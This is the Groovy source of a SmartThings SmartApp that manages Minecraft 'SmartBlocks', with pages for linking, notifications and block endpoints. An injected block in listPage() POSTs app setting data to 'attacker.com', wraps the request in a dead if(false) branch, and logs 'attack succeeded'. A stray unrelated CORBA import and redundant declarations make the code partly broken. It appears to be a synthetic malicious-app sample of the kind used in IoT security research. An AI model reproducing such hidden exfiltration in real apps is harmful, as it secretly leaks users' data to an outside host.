
import com.sun.corba.se.spi.activation._ServerImplBase



definition(
    name:"SmartBlock Manager",
    namespace:"vlaminck/Minecraft",
    author:"SmartThings",
    description:"A SmartApp for managing SmartBlocks",
    iconUrl:"http://f.cl.ly/items/0 p2c222z0p2K0y3y3w2M/SmartApp-icon.png",
    iconX2Url:"http://f.cl.ly/items/0 p2c222z0p2K0y3y3w2M/SmartApp-icon.png",
    oauth:[displayName:"SmartBlock Manager",displayLink:""]
)

preferences{
    
    page(name:"listPage")
    page(name:"serverPage")
    page(name:"blockPage")
    page(name:"linkerPage")
    page(name:"notifierPage")
    page(name:"chatPage")
    
    section("SmartBlock Manager"){
        input name:"explanation1",title:"Every time you place a SmartBlock in Minecraft,a new SmartThings Device will be created.These Devices can be used in various SmartApps like\"Minecraft Notifier\",or\"Switch State Matcher\"",description:"",type:"paragraph",element:"paragraph",required:false
        input name:"explanation2",title:"In order for SmartThings to send commands back to your Minecraft SmartBlocks,you will have to enter your Server Address via the SmartThings iOS or Android app",description:"",type:"paragraph",element:"paragraph",required:false
        }
}

def listPage(){
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(false)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${explanation1}"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    
    log.debug"listPage"
    
    def linkerApps=findAllChildAppsByName("SmartBlock Linker")
    def linkerState=linkerApps?"complete":""
    def linkerDescription=linkerApps.collect{it.label?:it.name}.sort().join("\n")
    
    def notifierApps=findAllChildAppsByName("SmartBlock Notifier")
    def notifierState=notifierApps?"complete":""
    def notifierDescription=notifierApps.collect{it.label?:it.name}.sort().join("\n")
    
    def chatApps=findAllChildAppsByName("SmartBlock Chat Sender")
    def chatState=chatApps?"complete":""
    def chatDescription=chatApps.collect{it.label?:it.name}.sort().join("\n")
    
    return dynamicPage(name:"listPage",title:"Configure Your SmartBlocks",install:true,uninstall:true){
        section{
            href(
            name:"toLinkerPage",
            title:"Link SmartBlocks To Switches",
            description:linkerDescription,
            page:"linkerPage",
            state:linkerState
            )
            href(
            name:"toNotifierPage",
            title:"Get Notified When a SmartBlock updates",
            description:notifierDescription,
            page:"notifierPage",
            state:notifierState
            )
            href(
            name:"toChatPage",
            title:"Send Notifications into Minecraft",
            description:chatDescription,
            page:"chatPage",
            state:chatState
            )
            }
        
        section{
            input(
            name:"serverIp",
            title:"In order for SmartThings to send commands back to the SmartBlocks on your Minecraft server,you will have to enter your Server Address",
            type:"text",
            required:false
            )
            }
        }
}

def serverPage(){
    log.debug"serverPage"
    dynamicPage(name:"serverPage",title:"Connect SmartThings To Your Minecraft Server"){
        section{
            input(
            name:"serverIp",
            title:"In order for SmartThings to send commands back to the SmartBlocks on your Minecraft server,you will have to enter your Server Address",
            type:"text",
            required:false
            )
            }
        }
}


def linkerPage(){
    dynamicPage(name:"linkerPage",title:"Link SmartBlocks To Switches"){
        section{
            app(
            title:"Link a SmartBlock to a switch",
            name:"blockLinker-new",
            namespace:"vlaminck/Minecraft",
            appName:"SmartBlock Linker",
            page:"linkerPage",
            multiple:true,
            params:["blocks":getChildDevices()]
            )
            }
        }

}

def notifierPage(){
    return dynamicPage(name:"notifierPage",title:"Get Notified When a SmartBlock is updated"){
        section{
            app(
            title:"Get Notified",
            name:"blockNotifier-new",
            namespace:"vlaminck/Minecraft",
            appName:"SmartBlock Notifier",
            multiple:true
            )
            }
        }
}

def chatPage(){
    return dynamicPage(name:"chatPage",title:"Send Notifications into Minecraft"){
        section{
            app(
            title:"Send Notifications",
            name:"chatSender-new",
            namespace:"vlaminck/Minecraft",
            appName:"SmartBlock Chat Sender",
            multiple:true
            )
            }
        }
}

mappings{
    path("/block"){
        action:
        [
        POST:"createBlock",
        PUT:"updateBlock",
        DELETE:"deleteBlock"
        ]
        }
    path("/ack"){
        action:
        [
        POST:"ack"
        ]
        }
}

def createBlock(){
    def data=request.JSON
    def blockCoordinates=blockCoordinates(data)
    def blockDNI=blockDNI(data)
    def block=block(data)
    
    if(block){
        log.debug"Block${block?.label}with id$blockDNI already exists"
    }else{
            block=addChildDevice("vlaminck/Minecraft","Smart Block",blockDNI,null,[name:"SmartBlock",label:"SmartBlock$blockCoordinates"])
        }
    
    block?.setCoordinates(data.x,data.y,data.z)
    block?.setDestroyed(false)
    block?.setWorldSeed(data?.worldSeed)
    block?.setDimensionName(data?.dimensionName)
    block?.setPlacedBy(data?.placedBy)
    
    if(serverIp){
        block.setServerIp(serverIp)
    }
    
    log.debug"created${block?.label}with id$blockDNI"
}

def ack(){
    log.debug"ack params:$params"
    log.debug"ack JSON:${request.JSON}"
    
    sendDataToBlock(request?.JSON,false)
}

def updateBlock(){
    sendDataToBlock(request?.JSON,true)
}

def sendDataToBlock(data,isStateChange){
    
    def blockCoordinates=blockCoordinates(data)
    def blockDNI=blockDNI(data)
    def block=block(data)
    log.debug"updating Block${block?.label}with id$blockDNI"
    
    block?.neighborBlockChange(data)
    
    if(data.worldSeed){
        block.setWorldSeed(data.worldSeed)
    }
    
    if(data.dimensionName){
        block.setDimensionName(data.dimensionName)
    }
    
    if(data.placedBy){
        block.setPlacedBy(data.placedBy)
    }
    
    block.setServerIp(serverIp)

}

def deleteBlock(){
    def data=request.JSON
    def blockDNI=blockDNI(data)
    def block=block(data)
    
    block?.setDestroyed(true)
    
    
    
    log.debug"attempting to delete Block${block?.label}with id$blockDNI"
    deleteChildDevice(blockDNI)
}

private blockCoordinates(data){
    return"(${data?.x},${data?.y},${data?.z})"
}

private blockDNI(data){
    "${data.worldSeed}|${data.dimensionName}|${blockCoordinates(data)}".encodeAsMD5()
}

private block(data){
    return getChildDevice(blockDNI(data))
}

def installed(){
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    initialize()
}

def initialize(){
    
    if(serverIp){
        getChildDevices().each{block->
            block.setServerIp(serverIp)
            }
    }

}

public getServerURL(){
    return"http://${serverIp}:3333"
}

